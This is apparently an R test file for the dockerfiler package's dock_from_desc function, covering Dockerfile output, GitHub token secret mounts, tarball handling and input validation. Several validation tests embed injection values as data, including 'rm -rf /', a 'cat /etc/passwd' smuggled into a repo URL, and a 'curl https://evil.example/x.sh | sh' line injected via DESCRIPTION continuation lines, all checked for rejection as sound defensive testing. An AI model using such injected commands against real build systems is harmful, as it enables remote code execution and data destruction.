base_pkg_ <- c(
  "base",
  "boot",
  "class",
  "cluster",
  "codetools",
  "compiler",
  "datasets",
  "foreign",
  "graphics",
  "grDevices",
  "grid",
  "KernSmooth",
  "lattice",
  "MASS",
  "Matrix",
  "methods",
  "mgcv",
  "nlme",
  "nnet",
  "parallel",
  "rpart",
  "spatial",
  "splines",
  "stats",
  "stats4",
  "survival",
  "tcltk",
  "tools",
  "utils"
)

descdir <- tempfile(pattern = "desc")
dir.create(descdir)
file.copy("DESCRIPTION__", descdir)
withr::with_dir(
  descdir,
  {
    test_that("dock_from_desc works", {

      skip_if(is_rdevel, "skip on R-devel")
      # pak::pkg_sysreqs(sysreqs_platform = "ubuntu") returns no
      # system_packages on macOS hosts, so the apt-get install line is
      # never emitted and the assertion below cannot pass. Tests
      # exercising the same path are skipped together.
      skip_on_os("mac")

      my_dock <- dock_from_desc(file.path(".", "DESCRIPTION__"))

      expect_s3_class(my_dock, "R6")
      expect_s3_class(my_dock, "Dockerfile")

      tpf <- tempfile()

      my_dock$write(tpf)

      tpf <- paste(
        readLines(tpf),
        collapse = " "
      )

      expect_true(
        grepl(
          "rocker/r-ver",
          tpf
        )
      )


      expect_true(
        grepl(
          "mkdir /build_zone",
          tpf
        )
      )
      expect_true(
        grepl(
          "rm -rf /build_zone",
          tpf
        )
      )

      x <- desc::desc_get_deps(file.path(".", "DESCRIPTION__"))
      x <- x[x$type == "Imports" & !(x$package %in% base_pkg_), ]
      if (length(x) > 0) {
        for (i in x$package) {
          expect_true(
            grepl(
              i,
              tpf
            )
          )
        }
      }

      # Only if package I guess
      # expect_true(file.exists(file.path(descdir, ".Rbuildignore")))
      expect_true(file.exists(file.path(descdir, ".dockerignore")))









      skip_if(is_rdevel, "Skippé sous R-devel")

      expect_true(
        grepl(
          "apt-get update && apt-get install",
          tpf
        )
      )

      unlink(tpf, recursive = TRUE)



    })

    test_that("dock_from_desc(strict_install = TRUE) prepends options(warn = 2) to every install RUN", {
      skip_if(is_rdevel, "skip on R-devel")
      out <- dock_from_desc(
        file.path(".", "DESCRIPTION__"),
        sysreqs = FALSE,
        strict_install = TRUE
      )
      install_lines <- grep(
        "(R|Rscript) -e '.*install",
        out$Dockerfile,
        value = TRUE
      )
      expect_gt(length(install_lines), 0L)
      for (line in install_lines) {
        expect_match(
          line,
          "options\\(warn = 2\\);",
          info = sprintf(
            "install RUN must carry options(warn = 2): %s",
            line
          )
        )
      }
    })

    test_that("dock_from_desc(strict_install = FALSE) does not prepend options(warn = 2)", {
      skip_if(is_rdevel, "skip on R-devel")
      out <- dock_from_desc(
        file.path(".", "DESCRIPTION__"),
        sysreqs = FALSE,
        strict_install = FALSE
      )
      df <- paste(out$Dockerfile, collapse = "\n")
      expect_false(grepl("options\\(warn = 2\\)", df))
    })

    test_that("dock_from_desc default is strict_install = TRUE so install warnings fail the build", {
      fmls <- formals(dock_from_desc)
      expect_true("strict_install" %in% names(fmls))
      expect_true(fmls$strict_install)
    })

    test_that("dock_from_desc rejects non-scalar / NA / non-logical strict_install", {
      skip_if(is_rdevel, "skip on R-devel")

      expect_error(
        dock_from_desc(
          file.path(".", "DESCRIPTION__"),
          sysreqs = FALSE,
          strict_install = NA
        ),
        "single `TRUE` or `FALSE`"
      )
      expect_error(
        dock_from_desc(
          file.path(".", "DESCRIPTION__"),
          sysreqs = FALSE,
          strict_install = c(TRUE, FALSE)
        ),
        "single `TRUE` or `FALSE`"
      )
      expect_error(
        dock_from_desc(
          file.path(".", "DESCRIPTION__"),
          sysreqs = FALSE,
          strict_install = "TRUE"
        ),
        "single `TRUE` or `FALSE`"
      )
      expect_error(
        dock_from_desc(
          file.path(".", "DESCRIPTION__"),
          sysreqs = FALSE,
          strict_install = 1
        ),
        "single `TRUE` or `FALSE`"
      )
      expect_error(
        dock_from_desc(
          file.path(".", "DESCRIPTION__"),
          sysreqs = FALSE,
          strict_install = NULL
        ),
        "single `TRUE` or `FALSE`"
      )
    })

    test_that("dock_from_desc rejects shell-metacharacter / unsafe values across user-supplied params", {
      skip_if(is_rdevel, "skip on R-devel")

      # extra_sysreqs: each element must be a Debian package name. A
      # value with `;` would inject into the apt-get RUN.
      expect_error(
        dock_from_desc(
          file.path(".", "DESCRIPTION__"),
          sysreqs = FALSE,
          extra_sysreqs = "libfoo; rm -rf /"
        ),
        "extra_sysreqs"
      )

      # repos: each URL must look like a real http(s) URL. A value with
      # `'` or `"` breaks the R / shell nested quoting in the
      # `echo "options(repos = ...)" > Rprofile.site` RUN.
      expect_error(
        dock_from_desc(
          file.path(".", "DESCRIPTION__"),
          sysreqs = FALSE,
          repos = c(CRAN = "https://evil'); cat /etc/passwd; #")
        ),
        "repos"
      )

      # FROM: a Docker image reference. Newlines or shell metacharacters
      # would break the FROM directive or change the image being pulled.
      expect_error(
        dock_from_desc(
          file.path(".", "DESCRIPTION__"),
          sysreqs = FALSE,
          FROM = "rocker/r-ver:4.0\nRUN evil"
        ),
        "FROM"
      )

      # AS: docker build-stage name. Newlines or shell metacharacters
      # would break the `FROM <X> AS <Y>` directive.
      expect_error(
        dock_from_desc(
          file.path(".", "DESCRIPTION__"),
          sysreqs = FALSE,
          AS = "stage1\nRUN evil"
        ),
        "`AS`"
      )

      # names(repos): backticks in names would inject command
      # substitution into the `echo "options(repos=...)"` RUN.
      expect_error(
        dock_from_desc(
          file.path(".", "DESCRIPTION__"),
          sysreqs = FALSE,
          repos = c(`CRAN; system('evil')` = "https://cran.rstudio.com/")
        ),
        "names\\(repos\\)"
      )
    })

    test_that("dock_from_desc emits no GITHUB_PAT plumbing by default", {
      skip_if(is_rdevel, "skip on R-devel")
      my_dock <- dock_from_desc(file.path(".", "DESCRIPTION__"))
      df <- paste(my_dock$Dockerfile, collapse = "\n")
      expect_false(grepl("GITHUB_PAT", df))
      expect_false(grepl("--mount=type=secret", df, fixed = TRUE))
    })

    test_that("dock_from_desc emits ARG/ENV GITHUB_PAT when github_pat = 'build_arg'", {
      skip_if(is_rdevel, "skip on R-devel")
      my_dock <- dock_from_desc(
        file.path(".", "DESCRIPTION__"),
        github_pat = "build_arg"
      )
      df <- paste(my_dock$Dockerfile, collapse = "\n")
      expect_match(df, "ARG GITHUB_PAT", fixed = TRUE)
      expect_match(df, 'ENV "GITHUB_PAT"="${GITHUB_PAT}"', fixed = TRUE)
      # No secret mount fragment in build_arg mode.
      expect_false(grepl("--mount=type=secret", df, fixed = TRUE))
    })

    test_that("dock_from_desc emits secret mounts when github_pat = 'secret'", {
      skip_if(is_rdevel, "skip on R-devel")
      my_dock <- dock_from_desc(
        file.path(".", "DESCRIPTION__"),
        github_pat = "secret"
      )
      df <- paste(my_dock$Dockerfile, collapse = "\n")
      # No top-level ARG / ENV in secret mode.
      expect_false(grepl("ARG GITHUB_PAT", df, fixed = TRUE))
      expect_false(grepl('ENV "GITHUB_PAT"', df, fixed = TRUE))
      # The install_local RUN must carry the secret-mount fragment plus
      # a `cat /run/secrets/...` shell prefix that exposes the PAT as
      # an env var to the inner R command (compatible with all BuildKit
      # versions, unlike the `env=GITHUB_PAT` shortcut on the mount).
      expect_match(
        df,
        "--mount=type=secret,id=github_pat GITHUB_PAT=$(cat /run/secrets/github_pat)",
        fixed = TRUE
      )
    })

    test_that("dock_from_desc(build_from_source = FALSE, update_tar_gz = FALSE) copies a prebuilt tar.gz", {
      skip_if(is_rdevel, "skip on R-devel")
      my_dock <- testthat::with_mocked_bindings(
        code = dock_from_desc(
          file.path(".", "DESCRIPTION__"),
          build_from_source = FALSE,
          update_tar_gz = FALSE
        ),
        get_sysreqs = function(...) character(0)
      )
      df <- paste(my_dock$Dockerfile, collapse = "\n")
      expect_match(df, "tar.gz", fixed = TRUE)
      expect_match(df, "remotes::install_local", fixed = TRUE)
      expect_match(df, "rm /app.tar.gz", fixed = TRUE)
      expect_false(grepl("mkdir /build_zone", df, fixed = TRUE))
    })

    test_that("dock_from_desc(build_from_source = FALSE, update_tar_gz = TRUE) builds a fresh tar.gz", {
      skip_if(is_rdevel, "skip on R-devel")
      build_called <- FALSE
      use_build_ignore_called <- FALSE
      my_dock <- testthat::with_mocked_bindings(
        code = dock_from_desc(
          file.path(".", "DESCRIPTION__"),
          build_from_source = FALSE,
          update_tar_gz = TRUE
        ),
        get_sysreqs = function(...) character(0),
        build = function(path, dest_path, vignettes) {
          build_called <<- TRUE
          fake <- file.path(dest_path, "fakepkg_0.0.0.tar.gz")
          file.create(fake)
          fake
        },
        use_build_ignore = function(files) {
          use_build_ignore_called <<- TRUE
          invisible(TRUE)
        }
      )
      # Both surviving lines from the dead-code-removal must execute on
      # this code path.
      expect_true(build_called)
      expect_true(use_build_ignore_called)
      df <- paste(my_dock$Dockerfile, collapse = "\n")
      expect_match(df, "remotes::install_local", fixed = TRUE)
    })

    test_that("dock_from_desc(update_tar_gz = TRUE) does not sweep a sibling package's tarball when the package name contains a dot", {
      skip_if(is_rdevel, "skip on R-devel")
      # `list.files(pattern =)` is a regex. With `Package: R.utils`,
      # `sprintf("%s_.+.tar.gz", "R.utils")` also matches
      # `RZutils_*.tar.gz` and would `file.remove()` it. Building the
      # pattern from a glob keeps the dot literal.
      dot_dir <- tempfile(pattern = "dot-pkg")
      dir.create(dot_dir)
      on.exit(unlink(dot_dir, recursive = TRUE), add = TRUE)
      writeLines(
        c(
          "Package: R.utils",
          "Version: 1.0.0",
          "Title: Demo",
          "Description: Demo.",
          "License: MIT",
          "Authors@R: person('A', 'B', email = 'a@b.c', role = c('aut', 'cre'))"
        ),
        file.path(dot_dir, "DESCRIPTION")
      )
      file.create(file.path(dot_dir, "R.utils_0.9.0.tar.gz"))
      file.create(file.path(dot_dir, "RZutils_0.9.0.tar.gz"))
      withr::with_dir(dot_dir, {
        testthat::with_mocked_bindings(
          code = testthat::with_mocked_bindings(
            code = dock_from_desc(
              "DESCRIPTION",
              build_from_source = FALSE,
              update_tar_gz = TRUE
            ),
            package_deps = function(packages) {
              data.frame(
                package = character(0),
                is_cran = logical(0),
                installed = character(0),
                stringsAsFactors = FALSE
              )
            },
            .package = "remotes"
          ),
          get_sysreqs = function(...) character(0),
          build = function(path, dest_path, vignettes) {
            fake <- file.path(dest_path, "R.utils_1.0.0.tar.gz")
            file.create(fake)
            fake
          },
          use_build_ignore = function(files) invisible(TRUE)
        )
      })
      # The unrelated sibling tarball must survive.
      expect_true(file.exists(file.path(dot_dir, "RZutils_0.9.0.tar.gz")))
      # The package's own old tarball is the one that gets cleaned.
      expect_false(file.exists(file.path(dot_dir, "R.utils_0.9.0.tar.gz")))
    })

    test_that("dock_from_desc rejects a DESCRIPTION whose Package field carries a continuation-line injection", {
      skip_if(is_rdevel, "skip on R-devel")
      # `read.dcf()` joins DCF continuation lines with `\n`. Without
      # validation, a `Package:` field with a continuation line is
      # interpolated into the `COPY <pkg>_*.tar.gz /app.tar.gz` line
      # generated for `build_from_source = FALSE`, injecting an extra
      # Dockerfile directive that runs as root at `docker build` time.
      evil_dir <- tempfile(pattern = "evil-desc")
      dir.create(evil_dir)
      on.exit(unlink(evil_dir, recursive = TRUE), add = TRUE)
      writeLines(
        c(
          "Package: app",
          " RUN curl -s https://evil.example/x.sh | sh #",
          "Version: 1.0.0",
          "Title: Demo",
          "Description: Demo.",
          "License: MIT",
          "Authors@R: person('A', 'B', email = 'a@b.c', role = c('aut', 'cre'))"
        ),
        file.path(evil_dir, "DESCRIPTION")
      )
      expect_error(
        testthat::with_mocked_bindings(
          code = dock_from_desc(
            file.path(evil_dir, "DESCRIPTION"),
            build_from_source = FALSE,
            update_tar_gz = FALSE
          ),
          get_sysreqs = function(...) character(0)
        ),
        "package name"
      )
    })

    test_that("dock_from_desc rejects a DESCRIPTION whose Imports field carries a continuation-line injection", {
      skip_if(is_rdevel, "skip on R-devel")
      # `desc::desc_get_deps()` joins DCF continuation lines with `\n`
      # like `read.dcf()`. Without validation, a crafted dependency
      # name is interpolated into the generated
      # `remotes::install_version("<name>", ...)` RUN, injecting an
      # extra Dockerfile directive that runs as root at `docker build`
      # time -- and this path fires on the default
      # `build_from_source = TRUE`, not only on the COPY path.
      evil_dir <- tempfile(pattern = "evil-desc-imports")
      dir.create(evil_dir)
      on.exit(unlink(evil_dir, recursive = TRUE), add = TRUE)
      writeLines(
        c(
          "Package: app",
          "Version: 1.0.0",
          "Title: Demo",
          "Description: Demo.",
          "License: MIT",
          "Authors@R: person('A', 'B', email = 'a@b.c', role = c('aut', 'cre'))",
          "Imports:",
          "    evilpkg",
          "     RUN curl -s https://evil.example/x.sh | sh #"
        ),
        file.path(evil_dir, "DESCRIPTION")
      )
      expect_error(
        testthat::with_mocked_bindings(
          code = dock_from_desc(file.path(evil_dir, "DESCRIPTION")),
          get_sysreqs = function(...) character(0)
        ),
        "package name"
      )
    })

    test_that("dock_from_desc messages the user when DESCRIPTION declares SystemRequirements", {
      skip_if(is_rdevel, "skip on R-devel")
      # Write a DESCRIPTION with a SystemRequirements field next to the
      # existing fixture so we exercise the `else if (!is.na(sr))`
      # message branch (only fires when extra_sysreqs is NULL).
      lines <- readLines("DESCRIPTION__")
      lines <- c(lines, "SystemRequirements: imagemagick, libcurl")
      desc_with_sr <- "DESCRIPTION_with_sr"
      writeLines(lines, con = desc_with_sr)
      on.exit(unlink(desc_with_sr), add = TRUE)

      expect_message(
        dock_from_desc(
          path = file.path(".", desc_with_sr),
          sysreqs = FALSE
        ),
        "imagemagick, libcurl"
      )
    })

    test_that("dock_from_desc with sysreqs = FALSE emits no apt-get install", {
      skip_if(is_rdevel, "skip on R-devel")
      my_dock <- dock_from_desc(
        file.path(".", "DESCRIPTION__"),
        sysreqs = FALSE
      )
      df <- paste(my_dock$Dockerfile, collapse = "\n")
      expect_false(grepl("apt-get install", df))
      expect_false(grepl("apt-get update", df))
    })

    test_that("dock_from_desc(extra_sysreqs = ...) emits an apt-get install for the extras", {
      skip_if(is_rdevel, "skip on R-devel")
      my_dock <- dock_from_desc(
        file.path(".", "DESCRIPTION__"),
        sysreqs = FALSE,
        extra_sysreqs = c("libsodium-dev", "libxml2-dev")
      )
      df <- paste(my_dock$Dockerfile, collapse = "\n")
      expect_match(df, "apt-get install -y[^\n]*libsodium-dev")
      expect_match(df, "apt-get install -y[^\n]*libxml2-dev")
    })

    test_that("dock_from_desc(expand = TRUE) emits one apt-get install RUN per requirement plus update / clean", {
      skip_if(is_rdevel, "skip on R-devel")
      my_dock <- dock_from_desc(
        file.path(".", "DESCRIPTION__"),
        sysreqs = FALSE,
        expand = TRUE,
        extra_sysreqs = c("libsodium-dev", "libxml2-dev")
      )
      df <- my_dock$Dockerfile
      expect_true(any(df == "RUN apt-get update"))
      expect_true(any(grepl("RUN apt-get install -y +libsodium-dev$", df)))
      expect_true(any(grepl("RUN apt-get install -y +libxml2-dev$", df)))
      expect_true(any(df == "RUN rm -rf /var/lib/apt/lists/*"))
    })

    test_that("dock_from_desc(build_from_source = FALSE, update_tar_gz = TRUE) builds the tar.gz and removes any pre-existing one", {
      skip_if(is_rdevel, "skip on R-devel")
      # Pre-existing tarball that should be removed before the rebuild.
      pkg_name <- "dockerfiler"
      old_tar <- sprintf("%s_0.0.0.tar.gz", pkg_name)
      writeLines("preexisting", con = old_tar)
      on.exit(unlink(old_tar), add = TRUE)

      fake_built <- sprintf("%s_9.9.9.tar.gz", pkg_name)

      # Avoid actually invoking pkgbuild + usethis; both are slow /
      # disk-touching and not what this test exercises (we want the
      # build branch to *run*, not to actually build). The bindings
      # are resolved through dockerfiler's own namespace because of
      # the `@importFrom pkgbuild build` and `@importFrom usethis
      # use_build_ignore`, so we mock against `.package = "dockerfiler"`.
      testthat::with_mocked_bindings(
        code = {
          expect_output(
            my_dock <- dock_from_desc(
              path = file.path(".", "DESCRIPTION__"),
              sysreqs = FALSE,
              build_from_source = FALSE,
              update_tar_gz = TRUE
            ),
            "removed from folder"
          )
          df <- paste(my_dock$Dockerfile, collapse = "\n")
          # The prebuilt-tarball plumbing must still be emitted, same
          # as the update_tar_gz = FALSE path.
          expect_match(df, "COPY dockerfiler_\\*.tar.gz /app.tar.gz")
          expect_match(
            df,
            "remotes::install_local\\(\"/app.tar.gz\",upgrade=\"never\"\\)"
          )
        },
        build = function(path, dest_path, vignettes) fake_built,
        use_build_ignore = function(files) invisible(files),
        .package = "dockerfiler"
      )

      # The pre-existing tarball must have been removed by the cleanup step.
      expect_false(file.exists(old_tar))
    })

    test_that("dock_from_desc(build_from_source = FALSE, update_tar_gz = FALSE) emits a COPY + install_local of the prebuilt tarball", {
      skip_if(is_rdevel, "skip on R-devel")
      my_dock <- dock_from_desc(
        file.path(".", "DESCRIPTION__"),
        sysreqs = FALSE,
        build_from_source = FALSE,
        update_tar_gz = FALSE
      )
      df <- paste(my_dock$Dockerfile, collapse = "\n")
      # The non-tar.gz-rebuilding path must:
      # 1. NOT use the source-mount path (mkdir /build_zone, ADD ., WORKDIR).
      expect_false(grepl("mkdir /build_zone", df, fixed = TRUE))
      expect_false(grepl("WORKDIR /build_zone", df, fixed = TRUE))
      # 2. COPY the tar.gz glob and call remotes::install_local on it.
      expect_match(df, "COPY dockerfiler_\\*.tar.gz /app.tar.gz")
      expect_match(
        df,
        "remotes::install_local\\(\"/app.tar.gz\",upgrade=\"never\"\\)"
      )
      # 3. Clean up the tarball after install.
      expect_match(df, "rm /app.tar.gz")
    })

    test_that("dock_from_desc emits remotes::install_github for non-CRAN deps", {
      skip_if(is_rdevel, "skip on R-devel")
      # The `Remotes:` (GitHub) install branch iterates over
      # `remotes_deps$remote` filtered by `!is_cran`. We synthesise a
      # mock `remotes::package_deps()` return with one CRAN row and
      # one GitHub row whose `$remote` carries
      # `(repo, username, sha)` so the test exercises the
      # `install_github` emission path without hitting the network or
      # requiring a non-CRAN package to be installed.
      fake_pd <- data.frame(
        package = c("cli", "fakepkg"),
        is_cran = c(TRUE, FALSE),
        installed = c("3.6.1", NA),
        stringsAsFactors = FALSE
      )
      fake_pd$remote <- list(
        list(),
        list(repo = "fakepkg", username = "ghuser", sha = "deadbeef")
      )
      testthat::with_mocked_bindings(
        code = {
          my_dock <- dock_from_desc(
            file.path(".", "DESCRIPTION__"),
            sysreqs = FALSE
          )
          df <- paste(my_dock$Dockerfile, collapse = "\n")
          expect_match(
            df,
            'remotes::install_github("ghuser/fakepkg@deadbeef")',
            fixed = TRUE
          )
        },
        package_deps = function(packages) fake_pd,
        .package = "remotes"
      )
    })

    test_that("dock_from_desc(github_pat = 'secret') decorates install_github with a secret mount", {
      skip_if(is_rdevel, "skip on R-devel")
      fake_pd <- data.frame(
        package = c("cli", "fakepkg"),
        is_cran = c(TRUE, FALSE),
        installed = c("3.6.1", NA),
        stringsAsFactors = FALSE
      )
      fake_pd$remote <- list(
        list(),
        list(repo = "fakepkg", username = "ghuser", sha = "deadbeef")
      )
      testthat::with_mocked_bindings(
        code = {
          my_dock <- dock_from_desc(
            file.path(".", "DESCRIPTION__"),
            sysreqs = FALSE,
            github_pat = "secret"
          )
          df <- paste(my_dock$Dockerfile, collapse = "\n")
          # The install_github RUN must carry the secret-mount fragment
          # ahead of the Rscript invocation on the same line.
          expect_match(
            df,
            "--mount=type=secret,id=github_pat GITHUB_PAT=\\$\\(cat /run/secrets/github_pat\\)[^\n]*remotes::install_github"
          )
        },
        package_deps = function(packages) fake_pd,
        .package = "remotes"
      )
    })
  }
)

unlink(descdir, recursive = TRUE)
